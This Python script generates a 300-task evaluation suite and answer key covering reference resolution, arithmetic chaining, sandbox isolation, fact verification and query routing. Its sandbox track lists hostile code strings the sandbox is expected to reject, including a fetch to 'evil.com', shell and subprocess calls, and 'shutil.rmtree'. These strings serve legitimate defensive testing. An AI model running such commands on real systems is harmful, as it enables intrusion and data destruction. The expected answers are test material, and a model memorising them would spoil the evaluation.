"""
Dataset Generator for Batches 1541–1580 Frozen Evaluation Suite (300 Tasks).
Location: experiments/batch1541_1580/data/generate_suite_300.py

Generates:
- 80 Multi-Turn Reference Resolution Cases (anaphora resolution, ambiguous antecedents, reset conversations, cross-tenant isolation).
- 60 Arithmetic Tool Chaining Cases (multi-step chained calculations, negative intermediates, decimals, division by zero traps).
- 60 Sandbox Execution & Isolation Cases (safe data scripts, timeout enforcement, AST module rejection, oversized output clamping).
- 60 Multi-Entity Proposition Verification Cases (multi-plan pricing, adjacent parameters, conflicting sources, unindexed unknowns).
- 40 Routing & Failure-Recovery Cases (direct response, calculator, sandbox tool, structured verification, abstention, error handling).

Outputs to experiments/batch1541_1580/data/evaluation_suite_300.json
"""
import hashlib
import json
from pathlib import Path

OUT_FILE = Path(__file__).resolve().parent / "evaluation_suite_300.json"
MANIFEST_FILE = Path(__file__).resolve().parent / "EVALUATION_SUITE_MANIFEST.json"


def build_suite() -> list[dict]:
    tasks = []

    # ========================================================
    # TRACK 1: MULTI-TURN REFERENCE RESOLUTION (80 Tasks)
    # ========================================================
    # 1a. Valid Antecedent Chaining (40 tasks)
    chains = [
        # (initial_expr, turn1_res, turn2_query, expected_turn2_expr, expected_turn2_res)
        ("120 + 80", 200, "now divide that by 4", "200 / 4", 50),
        ("50 * 20", 1000, "subtract 250 from that", "1000 - 250", 750),
        ("1024 - 512", 512, "multiply that by 2", "512 * 2", 1024),
        ("100 / 4", 25, "add 75 to that", "75 + 25", 100),
        ("15 * 10", 150, "divide the result by 3", "150 / 3", 50),
        ("2 ** 8", 256, "now divide that by 16", "256 / 16", 16),
        ("999 + 1", 1000, "multiply that by 5", "1000 * 5", 5000),
        ("500 - 200", 300, "divide that by 10", "300 / 10", 30),
        ("25 * 4", 100, "subtract 40 from that", "100 - 40", 60),
        ("1024 / 8", 128, "add 128 to that", "128 + 128", 256),
    ]
    # Replicate and vary with different pronouns ('it', 'the result', 'the answer')
    for cycle in range(4):
        for idx, (e1, r1, q2, e2, r2) in enumerate(chains):
            tid = len(tasks) + 1
            pronoun = ["that", "it", "the result", "the answer"][cycle]
            q2_mod = q2.replace("that", pronoun).replace("the result", pronoun)
            tasks.append({
                "id": f"ref_{tid:03d}",
                "track": "multi_turn_reference",
                "category": "valid_anaphora",
                "turn1_expression": e1,
                "turn1_result": r1,
                "turn2_query": q2_mod,
                "expected_resolved_expression": e2,
                "expected_result": r2,
                "should_resolve": True,
            })

    # 1b. Reset & Missing Antecedents (20 tasks)
    for idx in range(1, 21):
        tid = len(tasks) + 1
        tasks.append({
            "id": f"ref_{tid:03d}",
            "track": "multi_turn_reference",
            "category": "missing_or_reset_antecedent",
            "turn1_expression": None,
            "turn1_result": None,
            "turn2_query": "now divide that by 4",
            "expected_resolved_expression": None,
            "expected_result": None,
            "should_resolve": False,
        })

    # 1c. Cross-Tenant Isolation (20 tasks)
    for idx in range(1, 21):
        tid = len(tasks) + 1
        tasks.append({
            "id": f"ref_{tid:03d}",
            "track": "multi_turn_reference",
            "category": "cross_tenant_isolation",
            "turn1_tenant": "tenant_A",
            "turn1_expression": "1000 + 500",
            "turn1_result": 1500,
            "turn2_tenant": "tenant_B",  # Tenant B queries without previous state
            "turn2_query": "divide that by 3",
            "expected_resolved_expression": None,
            "expected_result": None,
            "should_resolve": False,
        })

    # ========================================================
    # TRACK 2: ARITHMETIC TOOL CHAINING (60 Tasks)
    # ========================================================
    # 2a. Multi-Step Chains (30 tasks: 3-step operations)
    triplet_cases = [
        ("100 + 50", 150, "multiply that by 2", 300, "subtract 50 from that", 250),
        ("500 - 100", 400, "divide that by 4", 100, "add 25 to that", 125),
        ("10 * 10", 100, "multiply that by 10", 1000, "divide that by 2", 500),
        ("64 / 2", 32, "multiply that by 4", 128, "subtract 28 from that", 100),
        ("2 ** 5", 32, "add 68 to that", 100, "multiply that by 3", 300),
        ("255 % 16", 15, "add 85 to that", 100, "divide that by 5", 20),
        ("50 * 4", 200, "subtract 250 from that", -50, "multiply that by 2", -100),  # Negative intermediate
        ("10.5 + 4.5", 15.0, "divide that by 2", 7.5, "multiply that by 4", 30.0),   # Decimal intermediate
        ("1000 / 10", 100, "add 900 to that", 1000, "divide that by 100", 10),
        ("12 * 12", 144, "add 56 to that", 200, "divide that by 8", 25),
    ]
    for cycle in range(3):
        for e1, r1, q2, r2, q3, r3 in triplet_cases:
            tid = len(tasks) + 1
            tasks.append({
                "id": f"chain_{tid:03d}",
                "track": "arithmetic_chaining",
                "category": "multi_step_chain",
                "step1_expr": e1,
                "step1_expected": r1,
                "step2_query": q2,
                "step2_expected": r2,
                "step3_query": q3,
                "step3_expected": r3,
                "expected_success": True,
            })

    # 2b. Chained Errors & Division by Zero Traps (30 tasks)
    for idx in range(1, 31):
        tid = len(tasks) + 1
        tasks.append({
            "id": f"chain_{tid:03d}",
            "track": "arithmetic_chaining",
            "category": "chained_domain_error",
            "step1_expr": "100 + 100",
            "step1_expected": 200,
            "step2_query": "divide that by 0",
            "step2_expected": None,
            "expected_error": "DIVISION_BY_ZERO",
            "expected_success": False,
        })

    # ========================================================
    # TRACK 3: SANDBOX EXECUTION & ISOLATION (60 Tasks)
    # ========================================================
    # 3a. Bounded Safe Scripts (20 tasks)
    safe_scripts = [
        ("print(sum([1, 2, 3, 4, 5]))", "15\n"),
        ("print(len('ChakrView'))", "9\n"),
        ("print([x*2 for x in range(4)])", "[0, 2, 4, 6]\n"),
        ("d = {'a': 1, 'b': 2}; print(d['a'] + d['b'])", "3\n"),
        ("print(sorted([5, 1, 4, 2]))", "[1, 2, 4, 5]\n"),
        ("print(math.factorial(5))", None),  # requires import math
        ("import math; print(math.sqrt(64))", "8.0\n"),
        ("import json; print(json.dumps({'status': 'ok'}))", '{"status": "ok"}\n'),
        ("import itertools; print(list(itertools.islice(range(10), 3)))", "[0, 1, 2]\n"),
        ("print(list(reversed([1, 2, 3])))", "[3, 2, 1]\n"),
    ]
    for cycle in range(2):
        for code, exp_out in safe_scripts:
            tid = len(tasks) + 1
            tasks.append({
                "id": f"sbx_{tid:03d}",
                "track": "sandbox_execution",
                "category": "safe_bounded_script",
                "code": code,
                "expected_status": "SUCCESS" if exp_out is not None else "RUNTIME_ERROR",
                "expected_stdout": exp_out,
            })

    # 3b. Malicious / Forbidden Import Rejections (20 tasks)
    forbidden_attacks = [
        "import socket; s = socket.socket()",
        "import urllib.request; urllib.request.urlopen('http://evil.com')",
        "import requests; requests.get('http://127.0.0.1')",
        "import os; os.system('dir')",
        "import subprocess; subprocess.run(['cmd'])",
        "import shutil; shutil.rmtree('.')",
        "import ctypes; ctypes.CDLL('ntdll.dll')",
        "import winreg; winreg.OpenKey(None, 'SOFTWARE')",
        "eval('1 + 1')",
        "exec('x = 5')",
        "open('test.txt', 'w')",
        "__import__('os')",
        "from http.client import HTTPConnection",
        "from multiprocessing import Process",
        "import threading",
        "from sys import modules",
        "import signal",
        "import asyncio",
        "from socketserver import TCPServer",
        "compile('x=1', '', 'exec')",
    ]
    for code in forbidden_attacks:
        tid = len(tasks) + 1
        tasks.append({
            "id": f"sbx_{tid:03d}",
            "track": "sandbox_execution",
            "category": "security_rejection",
            "code": code,
            "expected_status": "SECURITY_VIOLATION",
        })

    # 3c. Timeouts and Output Limit Enforcement (20 tasks)
    for idx in range(1, 11):
        tid = len(tasks) + 1
        tasks.append({
            "id": f"sbx_{tid:03d}",
            "track": "sandbox_execution",
            "category": "timeout_enforcement",
            "code": "while True: pass",
            "timeout": 0.5,
            "expected_status": "TIMEOUT",
        })
    for idx in range(1, 11):
        tid = len(tasks) + 1
        tasks.append({
            "id": f"sbx_{tid:03d}",
            "track": "sandbox_execution",
            "category": "output_clamping",
            "code": "print('A' * 100000)",  # 100 KB output (exceeds 64 KB cap)
            "expected_status": "OVERSIZED_OUTPUT",
        })

    # ========================================================
    # TRACK 4: STRUCTURED PROPOSITION VERIFICATION (60 Tasks)
    # ========================================================
    # 4a. Supported Multi-Entity Claims (15 tasks)
    prop_supp = [
        ("Subscription Pricing", "Starter Tier", "$150", "billing_subscription_tiers.md"),
        ("Subscription Pricing", "Professional Tier", "$450", "billing_subscription_tiers.md"),
        ("BM25 Hyperparameters", "k1 parameter", "1.5", "storage_bm25_index.md"),
        ("BM25 Hyperparameters", "b parameter", "0.75", "storage_bm25_index.md"),
        ("BLOB store", "maximum single document size", "10485760 bytes", "storage_blob_store.md"),
        ("Raft consensus", "heartbeat interval", "50 milliseconds", "network_consensus_raft.md"),
        ("mesh network", "data transmission port", "8443", "network_mesh_topology.md"),
        ("mesh network", "maximum node cluster diameter", "16", "network_mesh_topology.md"),
        ("Security Audit Trail", "log retention minimum", "365", "security_audit_logging.md"),
        ("Token Lifecycle", "expiration window", "3600 seconds", "security_auth_tokens.md"),
        ("Gateway API", "rate limit threshold", "60", "network_gateway_api.md"),
        ("Vector Index", "index dimension", "64", "storage_vector_index.md"),
        ("Uptime Guarantees", "downtime financial credit", "15%", "billing_sla_commitments.md"),
        ("Drain Sequencing", "graceful termination timeout", "60 seconds", "sop_cluster_drain.md"),
        ("In-Transit Cryptographic", "TLS", "TLS 1.3", "network_encryption_transit.md"),
    ]
    for ent, attr, val, doc in prop_supp:
        tid = len(tasks) + 1
        tasks.append({
            "id": f"prop_{tid:03d}",
            "track": "proposition_verification",
            "subject_entity": ent,
            "attribute_name": attr,
            "claimed_value": val,
            "expected_verdict": "SUPPORTED",
            "target_doc": doc,
        })

    # 4b. Contradicted Multi-Entity Claims (15 tasks)
    prop_contra = [
        ("Subscription Pricing", "Starter Tier", "$450", "billing_subscription_tiers.md"),
        ("Subscription Pricing", "Professional Tier", "$150", "billing_subscription_tiers.md"),
        ("BM25 Hyperparameters", "k1 parameter", "0.75", "storage_bm25_index.md"),  # Swapped with b
        ("BM25 Hyperparameters", "b parameter", "1.5", "storage_bm25_index.md"),   # Swapped with k1
        ("BLOB store", "maximum single document size", "50 MB", "storage_blob_store.md"),
        ("Raft consensus", "heartbeat interval", "250 milliseconds", "network_consensus_raft.md"),
        ("mesh network", "data transmission port", "5353", "network_mesh_topology.md"), # Discovery port, not data port
        ("mesh network", "maximum node cluster diameter", "64", "network_mesh_topology.md"),
        ("Security Audit Trail", "log retention minimum", "30 days", "security_audit_logging.md"),
        ("Token Lifecycle", "expiration window", "2 hours", "security_auth_tokens.md"),
        ("Gateway API", "rate limit threshold", "500", "network_gateway_api.md"),
        ("Vector Index", "index dimension", "512", "storage_vector_index.md"),
        ("Uptime Guarantees", "downtime financial credit", "50%", "billing_sla_commitments.md"),
        ("Drain Sequencing", "graceful termination timeout", "600 seconds", "sop_cluster_drain.md"),
        ("In-Transit Cryptographic", "TLS", "TLS 1.0", "network_encryption_transit.md"),
    ]
    for ent, attr, val, doc in prop_contra:
        tid = len(tasks) + 1
        tasks.append({
            "id": f"prop_{tid:03d}",
            "track": "proposition_verification",
            "subject_entity": ent,
            "attribute_name": attr,
            "claimed_value": val,
            "expected_verdict": "CONTRADICTED",
            "target_doc": doc,
        })

    # 4c. Insufficient Evidence Claims (15 tasks)
    prop_insuff = [
        ("Quantum Cryptography Core", "key length", "4096 qbits"),
        ("Mars Relay Satellite", "orbit altitude", "400 km"),
        ("ChakrView Blockchain", "gas limit", "30000000"),
        ("PostgreSQL Database", "max connections", "500"),
        ("Redis Cache Cluster", "eviction policy", "volatile-lru"),
        ("Kubernetes Ingress", "controller replica count", "5"),
        ("Apache Kafka", "replication factor", "3"),
        ("Elasticsearch Node", "heap size", "32 GB"),
        ("Consul Service Discovery", "wan gossip port", "8302"),
        ("Docker Daemon", "storage driver", "overlay2"),
        ("Terraform Cloud", "execution concurrency", "10"),
        ("Prometheus Server", "scrape interval", "15 seconds"),
        ("MongoDB Shard", "chunk size", "64 MB"),
        ("Spark Executor", "core allocation", "4"),
        ("WireGuard VPN", "keepalive interval", "25 seconds"),
    ]
    for ent, attr, val in prop_insuff:
        tid = len(tasks) + 1
        tasks.append({
            "id": f"prop_{tid:03d}",
            "track": "proposition_verification",
            "subject_entity": ent,
            "attribute_name": attr,
            "claimed_value": val,
            "expected_verdict": "INSUFFICIENT_EVIDENCE",
            "target_doc": None,
        })

    # 4d. Conflicting & Invalid Claims (15 tasks)
    for idx in range(1, 11):
        tid = len(tasks) + 1
        tasks.append({
            "id": f"prop_{tid:03d}",
            "track": "proposition_verification",
            "subject_entity": "ChakrMicro",
            "attribute_name": "hidden dimension",
            "claimed_value": "384 units",
            "expected_verdict": "CONFLICTING_EVIDENCE",
            "target_doc": "compute_arch_core.md and compute_arch_v07_draft.md",
        })
    for idx in range(1, 6):
        tid = len(tasks) + 1
        tasks.append({
            "id": f"prop_{tid:03d}",
            "track": "proposition_verification",
            "subject_entity": "",
            "attribute_name": "port",
            "claimed_value": "8080",
            "expected_verdict": "INVALID_CLAIM",
            "target_doc": None,
        })

    # ========================================================
    # TRACK 5: ROUTING & FAILURE RECOVERY (40 Tasks)
    # ========================================================
    routing_cases = [
        # 10 Calculator routes
        ("Calculate: 147 + 258", "CALCULATOR"),
        ("What is 1024 / 8?", "CALCULATOR"),
        ("Evaluate: 50 * 20", "CALCULATOR"),
        ("Calculate: 255 % 16", "CALCULATOR"),
        ("What is 2 ** 10?", "CALCULATOR"),
        ("Calculate: (50 + 50) / 10", "CALCULATOR"),
        ("Compute: 100 - 20 * 3", "CALCULATOR"),
        ("What is 10000 / 100?", "CALCULATOR"),
        ("Calculate: 12 * 12", "CALCULATOR"),
        ("Compute: 999 + 1", "CALCULATOR"),

        # 10 Verification routes
        ("Verify if the BM25 index k1 parameter is 1.5", "STRUCTURED_VERIFICATION"),
        ("Verify whether the Starter Tier monthly price is $150", "STRUCTURED_VERIFICATION"),
        ("Is the heartbeat interval in Raft consensus 50 milliseconds?", "STRUCTURED_VERIFICATION"),
        ("Confirm if TCP port is 8443 in the mesh network", "STRUCTURED_VERIFICATION"),
        ("Check whether maximum node cluster diameter is 16 in mesh network", "STRUCTURED_VERIFICATION"),
        ("Verify if BM25 parameter b is set to 0.75", "STRUCTURED_VERIFICATION"),
        ("Is it true that Starter Tier monthly price is $250?", "STRUCTURED_VERIFICATION"),
        ("Verify if Raft heartbeat interval is set to 250 ms", "STRUCTURED_VERIFICATION"),
        ("Check if mesh network data port is 80", "STRUCTURED_VERIFICATION"),
        ("Verify if BM25 k1 parameter is 2.5", "STRUCTURED_VERIFICATION"),

        # 10 Direct Chat / Greeting routes
        ("Hello", "DIRECT_RESPONSE"),
        ("Hi there", "DIRECT_RESPONSE"),
        ("Hey", "DIRECT_RESPONSE"),
        ("Good morning", "DIRECT_RESPONSE"),
        ("Good evening", "DIRECT_RESPONSE"),
        ("Thanks", "DIRECT_RESPONSE"),
        ("Thank you very much", "DIRECT_RESPONSE"),
        ("Hi", "DIRECT_RESPONSE"),
        ("Hello assistant", "DIRECT_RESPONSE"),
        ("Hey there!", "DIRECT_RESPONSE"),

        # 10 Honest Abstention routes
        ("What is the capital city of planet Mars?", "ABSTAIN"),
        ("Who is the prime minister of Mars?", "ABSTAIN"),
        ("What is the speed of light in vacuum?", "ABSTAIN"),
        ("Who wrote the play The Cherry Orchard?", "ABSTAIN"),
        ("What is the atomic mass of Gold in the periodic table?", "ABSTAIN"),
        ("What year was the construction of the Sydney Opera House completed?", "ABSTAIN"),
        ("What is the distance from Earth to the Moon?", "ABSTAIN"),
        ("What is the legal voting age in Japan?", "ABSTAIN"),
        ("Who was the president of the Moon in 1920?", "ABSTAIN"),
        ("What is the temperature of the surface of the Sun?", "ABSTAIN"),
    ]
    for q, r in routing_cases:
        tid = len(tasks) + 1
        tasks.append({
            "id": f"route_{tid:03d}",
            "track": "routing_and_recovery",
            "query": q,
            "expected_route": r,
        })

    return tasks


def main():
    suite = build_suite()
    print(f"Total tasks constructed: {len(suite)}")

    with open(OUT_FILE, "w", encoding="utf-8") as f:
        json.dump(suite, f, indent=2)

    hasher = hashlib.sha256()
    with open(OUT_FILE, "rb") as f:
        while chunk := f.read(65536):
            hasher.update(chunk)
    file_hash = hasher.hexdigest()

    manifest = {
        "dataset_name": "ChakrView Batches 1541-1580 Frozen Multi-Turn Evaluation Suite (300 Tasks)",
        "milestone": "Batches 1541-1580",
        "total_tasks": len(suite),
        "sha256": file_hash,
        "tracks": {
            "Track_1_Multi_Turn_Reference": 80,
            "Track_2_Arithmetic_Chaining": 60,
            "Track_3_Sandbox_Execution": 60,
            "Track_4_Proposition_Verification": 60,
            "Track_5_Routing_And_Recovery": 40,
        }
    }
    with open(MANIFEST_FILE, "w", encoding="utf-8") as f:
        json.dump(manifest, f, indent=2)

    print(f"Dataset generated at {OUT_FILE} (SHA-256: {file_hash})")


if __name__ == "__main__":
    main()
